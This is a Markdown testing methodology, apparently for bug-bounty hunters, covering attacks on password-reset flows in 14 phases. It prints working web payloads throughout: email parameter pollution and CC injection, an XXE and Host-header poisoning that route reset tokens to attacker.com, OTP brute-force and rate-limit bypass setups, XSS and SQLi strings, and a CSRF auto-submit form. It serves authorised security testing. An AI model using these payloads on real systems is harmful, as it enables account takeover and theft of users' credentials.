# 🔑 Password Reset / Forgot Password Testing Methodology

> **A complete, structured approach to breaking password reset and account-recovery flows — from recon to business logic abuse.**

---

<div align="center">

![Type](https://img.shields.io/badge/Vulnerability-Password%20Reset%20%2F%20ATO-red?style=for-the-badge)
![Scope](https://img.shields.io/badge/Scope-Tokens%20%7C%20Email%20%7C%20Session%20%7C%20Logic-orange?style=for-the-badge)
![Approach](https://img.shields.io/badge/Approach-Manual%20%2B%20Burp-blue?style=for-the-badge)

</div>

---

## 📋 Table of Contents

1. [Phase 1 — Recon & Flow Mapping](#-phase-1--recon--flow-mapping)
2. [Phase 2 — Email Parameter Manipulation](#-phase-2--email-parameter-manipulation)
3. [Phase 3 — Host Header Poisoning](#-phase-3--host-header-poisoning)
4. [Phase 4 — Token Predictability & Entropy](#-phase-4--token-predictability--entropy)
5. [Phase 5 — Token Expiration & Reuse](#-phase-5--token-expiration--reuse)
6. [Phase 6 — Token Leakage Vectors](#-phase-6--token-leakage-vectors)
7. [Phase 7 — Rate Limiting & Brute Force](#-phase-7--rate-limiting--brute-force)
8. [Phase 8 — MFA Bypass via Reset](#-phase-8--mfa-bypass-via-reset)
9. [Phase 9 — Session Management After Reset](#-phase-9--session-management-after-reset)
10. [Phase 10 — CSRF on Password Reset](#-phase-10--csrf-on-password-reset)
11. [Phase 11 — User Enumeration](#-phase-11--user-enumeration)
12. [Phase 12 — Input Validation & Injection](#-phase-12--input-validation--injection)
13. [Phase 13 — Account & Business Logic Edge Cases](#-phase-13--account--business-logic-edge-cases)
14. [Phase 14 — Tools & Burp Extensions](#-phase-14--tools--burp-extensions)
15. [Summary Workflow](#️-summary-workflow)
16. [Quick Decision Tree](#-quick-decision-tree)
17. [Vulnerability Priority Reference](#-vulnerability-priority-reference)

---

## 🔍 Phase 1 — Recon & Flow Mapping

Before touching payloads, map the full reset/recovery attack surface.

```
1. Find every reset-related endpoint:
     /forgot-password, /reset-password, /change-password
     /api/v*/users/reset, /api/v*/auth/forgot
     Mobile API equivalents (often less protected)
     Legacy/deprecated endpoints
2. Note request method (GET vs POST) and every parameter:
     email, username, phone, token, code
3. Identify token delivery: email link, SMS OTP, in-app code
4. Note whether reset uses a LINK (token in URL) or a CODE (OTP in form)
5. Check if OAuth/SSO-linked accounts have a different (or no) reset flow
6. Check if MFA is required anywhere in the reset flow
```

### Checklist

```
[ ] Map all reset/forgot endpoints, including API and mobile versions
[ ] Identify every parameter in request AND response
[ ] Note how confirmation is delivered (email, SMS, push)
[ ] Check reset behavior for OAuth/SSO-only accounts
[ ] Identify if/where MFA is enforced during reset
[ ] Find out how tokens are generated (see clues below)
```

### Clues on Token Generation

```
- Generated from a timestamp
- Generated from the user's ID
- Generated from the user's email
- Generated from the user's name
- Random but short (predictable via brute force)
```

---

## ✉️ Phase 2 — Email Parameter Manipulation

Manipulate the `email` parameter to redirect the reset link/token to an attacker-controlled address.

### HTTP Parameter Pollution (HPP)

```
POST /reset HTTP/1.1
Host: target.com

email=victim@mail.com&email=hacker@mail.com
```

### Carbon Copy (CC Header Injection)

```
email=victim@mail.com%0a%0dcc:hacker@mail.com
email=victim@mail.com%0acc:hacker@mail.com
```

### Separator-Based Injection

```
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
email=victim@mail.com%00hacker@mail.com
email=victim@mail.com;hacker@mail.com
```

### JSON Array / Comma Injection (JSON body)

```json
{"email": ["victim@mail.com", "hacker@mail.com"]}
```
```json
{"email":"victim@mail.com","hacker@mail.com","token":"xxxxxxxxxx"}
```

### No Domain / No TLD

```
email=victim
email=victim@mail
```

### XML / XXE (if endpoint accepts XML)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/"> ]>
<reset><email>&xxe;victim@mail.com</email></reset>
```

### Content-Type Switching

```
Use Burp's Content Type Converter extension to switch
application/x-www-form-urlencoded ↔ application/json ↔ application/xml
— then repeat every test above in each format, since validation
logic is sometimes format-specific and only covers one content-type.
```

> 📚 Reference: [HackerOne #1175081](https://hackerone.com/reports/1175081) · [#315879](https://hackerone.com/reports/315879)

---

## 🌐 Phase 3 — Host Header Poisoning

The app often generates the reset link as `https://{Host}/reset?token=abc` — if `Host` is attacker-controlled, the victim clicks a link pointing at the attacker's server, leaking the token.

### Direct Host Override

```
POST /forgot-password HTTP/1.1
Host: attacker.com

email=victim@mail.com
```

### X-Forwarded-Host

```
Host: target.com
X-Forwarded-Host: attacker.com
```
or reversed:
```
Host: attacker.com
X-Forwarded-Host: target.com
```

### Duplicate Host Header

```
Host: target.com
Host: attacker.com
```

### Subdomain Bypass

```
Host: target.com.attacker.com
```

### Other Header Variants to Try

```
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Original-URL: attacker.com
Forwarded: host=attacker.com
```

### Setup

```
1. Use ngrok or Burp Collaborator as your out-of-band listener
2. Trigger the reset request with a poisoned Host header
3. Check your listener — if the token/reset-link request arrives,
   the app is vulnerable to reset-link poisoning
```

> 📚 Reference: [HackerOne #226659](https://hackerone.com/reports/226659)

---

## 🎲 Phase 4 — Token Predictability & Entropy

### 4.1 — Predictability Patterns

```
1. Request multiple tokens for the same account in quick succession
2. Analyze for patterns:
     - Base64-encoded email/username → echo "token" | base64 -d
     - Unix timestamp embedded → check token length, decode substrings
     - Sequential integers → request tokens for two accounts, compare
     - MD5/SHA1 of email or timestamp → try md5(email+timestamp)
```

### 4.2 — Insufficient Entropy

```
1. Collect a batch of tokens (10-20+) issued for the same/different accounts
2. Load them into Burp Sequencer
3. Check the FIPS score — a low randomness score means the token
   generator is predictable
4. Note token length — under ~16 bytes of real entropy is typically weak
```

### 4.3 — Short OTP Brute Force

If the OTP/code is 4-6 digits (max 100,000-1,000,000 combinations):

```
POST /reset/verify HTTP/1.1
Host: target.com

email=victim@mail.com&code=§000000§
```

```
1. Send this request to Burp Intruder
2. Payload type: Numbers, range 000000-999999 (pad to code length)
3. Watch for: lockout after N attempts, CAPTCHA triggers, response
   length/status changes that indicate success
```

---

## ⏳ Phase 5 — Token Expiration & Reuse

### 5.1 — Token Still Works After Use

```
1. Request a reset token → use it to change the password
2. Submit the SAME token again in a new request
3. If it still works → token not invalidated after use ✅ (vuln)
```

### 5.2 — Old Token Still Works After a New One Is Requested

```
1. Request token #1 → don't use it
2. Request token #2 → use token #2 to reset the password
3. Try token #1 again
4. If it still works → old tokens not invalidated ✅ (vuln)
```

### 5.3 — Token Still Works After Manual Password Change

```
1. Request a token
2. Log in directly and change the password via account settings
3. Try using the original token to reset the password again
4. If it works → token not invalidated on password change ✅ (vuln)
```

### 5.4 — Token Still Works After Email Change

```
1. Request a token
2. Change your account's email address
3. Try using the original token
4. If it works → token not tied to email/account state ✅ (vuln)
```

### 5.5 — Token Doesn't Expire Over Time

```
1. Request a token
2. Wait past the stated expiry window (5 min, 1 hr, 24 hr)
3. Attempt to use it
4. If it works → missing or broken expiration ✅ (vuln)
```

### 5.6 — Cross-Timing Scenario (token requested before a competing action)

```
1. Request password reset link #1 → leave it unused in inbox
2. Log out, log back in normally, and change the password via
   account settings (or via a fresh reset link #2)
3. Go back and use link #1
4. If it still works → the earlier token survives an unrelated
   password change ✅ (vuln)
```

> 📚 Reference: [HackerOne #898841](https://hackerone.com/reports/898841) · [#283550](https://hackerone.com/reports/283550) · [#948345](https://hackerone.com/reports/948345) · [#685007](https://hackerone.com/reports/685007)

---

## 📡 Phase 6 — Token Leakage Vectors

### 6.1 — Token in API Response Body

```
1. Intercept the password-reset request in Burp
2. Inspect the HTTP response for token, resetLink, or url fields
3. If the token/link is returned directly → direct token leakage ✅
```

```json
HTTP/1.1 200 OK
{
  "resetPasswordLink": "https://target.com/reset?token=XXXXXXXX"
}
```

### 6.2 — Token in Referer Header

```
1. Click the reset link from your email (token now sits in the URL bar)
2. Click any external/outbound link on that reset page (social icons,
   help/support links, etc.) while Burp is running
3. Check the outgoing request's Referer header for the leaked token
```

```
Referer: https://target.com/reset-password/TOKEN_HERE/
```

> 📚 Reference: [HackerOne #751581](https://hackerone.com/reports/751581)

### 6.3 — Token in Browser History / Server Logs

```
If the token lives in the URL (?reset_token=abc), it's stored in
browser history and typically in server access logs too. Lower
severity alone, but still worth reporting — recommend moving the
token into the POST body or a one-time-use code exchanged out of band.
```

---

## 🔓 Phase 7 — Rate Limiting & Brute Force

### 7.1 — No Rate Limit on Reset Requests (Email Flooding)

```
1. Intercept the reset request in Burp
2. Send to Intruder, use Null payloads, count = 100+
3. If every request returns 200 → victim's inbox gets flooded → DoS
```

### 7.2 — Rate Limit Bypass Techniques

```
# IP rotation via headers
X-Forwarded-For: 1.2.3.§4§
X-Real-IP: 1.2.3.§4§
CF-Connecting-IP: 1.2.3.§4§

# Case / plus-addressing variation on the same inbox
VICTIM@mail.com
Victim@mail.com
victim+1@mail.com
victim+2@mail.com
```

### 7.3 — OTP / Code Brute Force (if rate limit absent)

```
POST /reset/verify
email=victim@mail.com&otp=§000000§
```

```
Payload: Numbers, 000000-999999
Watch for: lockout after N attempts, CAPTCHA triggers, response
length/status changes
```

### 7.4 — Password-Change Form Brute Force

```
Check if there's a lockout on the current-password field during a
logged-in password change — this is a separate attack surface from
the reset-OTP flow and is often forgotten.
```

> 📚 Reference: [HackerOne #838572](https://hackerone.com/reports/838572)

---

## 🛡️ Phase 8 — MFA Bypass via Reset

### 8.1 — Reset Bypasses MFA Requirement

```
1. Enable MFA (TOTP/SMS) on your test account
2. Initiate a password reset
3. Complete the reset using only the email link — without entering MFA
4. If login succeeds afterward without MFA → MFA bypassed via reset ✅
```

### 8.2 — Reset Silently Disables MFA

```
1. Enable MFA
2. Reset the password via the email link
3. Check MFA settings afterward — if MFA is now disabled →
   MFA silently removed ✅
```

### 8.3 — MFA Code Leaks in Response

```
Intercept the MFA-send request and check if the OTP/code is returned
directly in the API response (common on mobile-API backends that
skip proper server-side delivery separation).
```

### 8.4 — MFA Step Skippable via Direct URL/State

```
1. During a multi-step reset flow that requires MFA at step 2,
   observe the URL/state structure
2. Try jumping straight to step 3
3. Check whether the app actually validates that step 2 completed,
   or just trusts client-side navigation
```

---

## 🧷 Phase 9 — Session Management After Reset

### 9.1 — Sessions Remain Valid After Password Reset

```
1. Log in → copy the session cookie (Browser A)
2. In Browser B, trigger a password reset and complete it
3. Return to Browser A → attempt a privileged action
4. If it still works → sessions not invalidated on reset ✅
```

### 9.2 — Sessions Remain Valid After Manual Password Change

```
1. Log in on two browsers/devices
2. Change the password in Browser A
3. Try to use Browser B's session for actions
4. If still valid → concurrent sessions not invalidated ✅
```

### 9.3 — API Tokens Not Invalidated

```
After a password change, test whether Bearer tokens / API keys
issued before the change still authenticate successfully.
```

---

## 🛡️ Phase 10 — CSRF on Password Reset

### 10.1 — Check for a CSRF Token

```
1. Capture the reset/change-password request in Burp
2. Look for csrf_token, _token, __RequestVerificationToken, etc.
3. If absent → strip any token found and resubmit to confirm it's
   not enforced server-side
```

### 10.2 — Check SameSite Cookie Attributes

```
Look at the response header:
  Set-Cookie: session=...; SameSite=Strict
If SameSite=None or the attribute is missing on the session cookie,
CSRF is likely exploitable.
```

### 10.3 — Build a CSRF PoC

```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://target.com/reset-password" method="POST">
      <input type="hidden" name="email" value="victim@mail.com" />
    </form>
  </body>
</html>
```

### 10.4 — Referer/Origin Validation

```
Remove the Referer header entirely — if the request still succeeds,
CSRF protection is incomplete/misconfigured.
```

> 📚 Reference: [HackerOne #315879](https://hackerone.com/reports/315879)

---

## 🕵️ Phase 11 — User Enumeration

### 11.1 — Response Message Difference

```
Valid email    → "Reset link sent"
Invalid email  → "Email not found" / "User account doesn't exist"
If the messages differ → user enumeration ✅
```

### 11.2 — HTTP Status Code Difference

```
Valid email   → 200 OK
Invalid email → 404 / 400 → enumeration possible
```

### 11.3 — Timing Difference

```
Use Burp Comparer or a simple timing script. A valid email usually
triggers a DB lookup + email dispatch, adding measurable latency.
A consistent delta of ~50-100ms+ is a timing oracle.
```

### 11.4 — Bulk Enumeration via Intruder

```
Load a wordlist of common emails/usernames into Intruder against the
reset endpoint, flag responses with a different length/status/timing.
```

> 📚 Reference: [HackerOne #77067](https://hackerone.com/reports/77067)

---

## 💉 Phase 12 — Input Validation & Injection

### 12.1 — XSS in the Email Field (reflected on the reset page)

```
"<svg/onload=alert(1)>"@gmail.com
"><script>alert(1)</script>@gmail.com
javascript:alert(1)@gmail.com
```

### 12.2 — HTML Injection in Email/Name Field (rendered in the reset email)

```
First Name: <a href="https://attacker.com"><h1>Click here to verify</h1></a>
```

```
Check whether the outbound reset email actually renders HTML — if
so, this enables convincing link-spoofing/phishing sent FROM the
target's own legitimate mail infrastructure.
```

> 📚 Reference: [HackerOne #111094](https://hackerone.com/reports/111094)

### 12.3 — SQL Injection in Token or Email Field

```
email=victim'@mail.com
token=abc' OR '1'='1
```

> See `SQL-Injection.md` for the full exploitation chain if this fires.

### 12.4 — Password Strength Bypass via Proxy

```
1. Try setting a weak password via the UI → note the client-side error
2. Intercept in Burp, change the value to 123456
3. Forward the request — if accepted → client-side-only validation ✅
```

### 12.5 — Password Change Without Current Password

```
1. Go to account settings → change password
2. Intercept the request → remove the current_password field entirely
3. If the password still changes → missing current-password
   verification ✅ (often chains into a CSRF-driven ATO)
```

---

## 🧩 Phase 13 — Account & Business Logic Edge Cases

A grab-bag of logic flaws that don't fit the phases above but are worth running through every target.

| # | Flaw | How to Test |
|---|------|-------------|
| 1 | **Token not bound to account** | Request a token for Account A, submit it while authenticating/resetting Account B |
| 2 | **Account verification bypass** | Register with an unverified email/phone, try accessing privileged features anyway; try tampering a `verified=true`-style parameter |
| 3 | **Weak security-question exploitation** | Test common answers, case-sensitivity, brute force with no lockout, or attempt to skip the question step entirely |
| 4 | **Account merger/unlinking flaw** | Link an OAuth/SSO account, unlink it, check for orphaned access or retained privileges |
| 5 | **Password history bypass** | Reuse a recent password via minor variation (`Password1!` → `Password2!`); check if history applies to reset flows too, not just in-app changes |
| 6 | **Account lockout bypass** | Trigger lockout, then try a different login endpoint (mobile API, legacy API), a different IP/UA, or use the reset flow itself to "unlock" the account |
| 7 | **Recovery email changed without verification** | Change the recovery email in settings; check if the OLD email gets notified and if the NEW one requires confirmation before becoming active |
| 8 | **Password reset flooding** | Send continuous reset requests to a target email and confirm no throttling/queue protection exists |
| 9 | **Deactivated account recovery flaw** | Deactivate an account, then attempt a password reset for that same email — check if it silently reactivates the account |
| 10 | **OAuth-linked account gets a password enabled** | For an SSO-only account, run the email-based reset flow anyway — check if it creates a NEW password-based login path alongside SSO, widening the attack surface |
| 11 | **Mass assignment via account endpoints** | Map account-management endpoints, try adding `role`, `isAdmin`, `user_id` fields the UI doesn't expose |
| 12 | **"No domain in value" quirk** | Some backends accept a bare username with no `@domain.tld` and still process a reset — worth a quick check on its own |

---

## 🛠️ Phase 14 — Tools & Burp Extensions

| Tool | Purpose |
|------|---------|
| **Burp Suite Pro** | Core testing — Intercept, Repeater, Intruder, Sequencer |
| **Burp Collaborator** | Catch out-of-band token leaks (Host header, XXE) |
| **Content Type Converter** (Burp ext) | Switch request formats (JSON/XML/form) |
| **Logger++** (Burp ext) | Log all requests for token pattern analysis |
| **Autorize** (Burp ext) | Test horizontal privilege escalation |
| **ngrok** | Out-of-band listener for Host header poisoning |
| **jwt_tool** | If reset tokens are JWTs |
| **hashcat / john** | Offline token cracking if tokens are hash-based |
| **temp-mail.org** | Disposable inboxes for multi-account testing |
| **Browser DevTools** | Inspect network requests, cookies, local storage |

---

## ⚔️ Summary Workflow

```
┌──────────────────────────────────────────────────────┐
│           PASSWORD RESET TESTING WORKFLOW              │
├──────────────────────────────────────────────────────┤
│                                                        │
│  1. 🔍 Map the Flow (endpoints, params, token type)   │
│            ↓                                          │
│  2. ✉️ Manipulate the Email Parameter (HPP/CC/JSON)   │
│            ↓                                          │
│  3. 🌐 Test Host Header Poisoning                     │
│            ↓                                          │
│  4. 🎲 Analyze Token Predictability & Entropy         │
│            ↓                                          │
│  5. ⏳ Test Token Expiration & Reuse                  │
│            ↓                                          │
│  6. 📡 Check Token Leakage (response/Referer/logs)    │
│            ↓                                          │
│  7. 🔓 Test Rate Limiting & Brute Force               │
│            ↓                                          │
│  8. 🛡️ Test MFA Bypass via Reset                      │
│            ↓                                          │
│  9. 🧷 Test Session Persistence After Reset           │
│            ↓                                          │
│ 10. 🛡️ Test CSRF on Reset/Change Endpoints            │
│            ↓                                          │
│ 11. 🕵️ Test for User Enumeration                      │
│            ↓                                          │
│ 12. 💉 Test Input Validation (XSS/HTML/SQLi)          │
│            ↓                                          │
│ 13. 🧩 Run Through Business Logic Edge Cases          │
│            ↓                                          │
│ 14. 📝 Document & Report                              │
│                                                        │
└──────────────────────────────────────────────────────┘
```

---

## 🧠 Quick Decision Tree

```
Reset uses a LINK (token in URL)?
    ├── YES → check Referer leakage, browser history exposure,
    │         Host header poisoning (Phase 3, 6)
    │
    └── NO, uses a CODE/OTP → check length/entropy → brute force
                               if no rate limit (Phase 4, 7)

Token/response inspected in Burp?
    ├── Token visible in response body? → Direct leakage (Phase 6.1)
    ├── Token reusable after password change? → Expiration flaw (Phase 5)
    └── Token accepted for a DIFFERENT account? → Missing binding (Phase 13.1)

Email parameter accepted as-is?
    ├── Try HPP, CC injection, separators, JSON array (Phase 2)
    └── If reflected anywhere → also test XSS/HTML injection (Phase 12)

Reset flow reachable while MFA is enabled?
    ├── Completes without MFA prompt? → MFA bypass (Phase 8.1)
    └── MFA disabled afterward? → MFA silently removed (Phase 8.2)

Nothing above hits?
    → Fall back to CSRF PoC, user enumeration timing, and the
      business logic edge-case table (Phase 10, 11, 13)
```

---

## 📊 Vulnerability Priority Reference

| Vulnerability | Typical Severity |
|---|---|
| Host Header Poisoning → ATO | Critical |
| Token not invalidated after use | High |
| OTP/token brute force (no rate limit) | High |
| Email parameter pollution → ATO | High |
| Token leaked in API response | High |
| MFA bypassed via reset | High |
| Sessions not invalidated after reset | Medium |
| Token leaked in Referer header | Medium |
| CSRF on password reset | Medium |
| User enumeration via reset page | Low–Medium |
| No rate limit on reset requests (email flood) | Low–Medium |
| Token in URL (browser history leak) | Low |
| HTML injection in reset email | Low |
| XSS in email field | Low–Medium |

---

### 📚 Resources

- 🔗 [10 Password Reset Flaws — anugrahsr](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
- 🔗 [PortSwigger — Password Reset Poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)
- 🔗 [All About Password Reset Vulnerabilities — InfoSec Writeups](https://infosecwriteups.com/all-about-password-reset-vulnerabilities-3bba86ffedc7)
- 🔗 [HackerOne Hacktivity — Password Reset](https://hackerone.com/hacktivity?querystring=password+reset)
- HackerOne reports referenced throughout: [#898841](https://hackerone.com/reports/898841) · [#283550](https://hackerone.com/reports/283550) · [#948345](https://hackerone.com/reports/948345) · [#685007](https://hackerone.com/reports/685007) · [#315879](https://hackerone.com/reports/315879) · [#751581](https://hackerone.com/reports/751581) · [#838572](https://hackerone.com/reports/838572) · [#226659](https://hackerone.com/reports/226659) · [#1175081](https://hackerone.com/reports/1175081) · [#77067](https://hackerone.com/reports/77067) · [#111094](https://hackerone.com/reports/111094)
- Companion docs: `2FA-Bypass.md`, `API-Testing-Methodology.md`, `SQL-Injection.md`

---

<div align="center">

### 🔥 Map the flow. Poison the link. Break the binding.

---

*Happy Hacking — responsibly and ethically* 🛡️
*For educational and authorized security testing purposes only. Always obtain written permission before testing.*

</div>
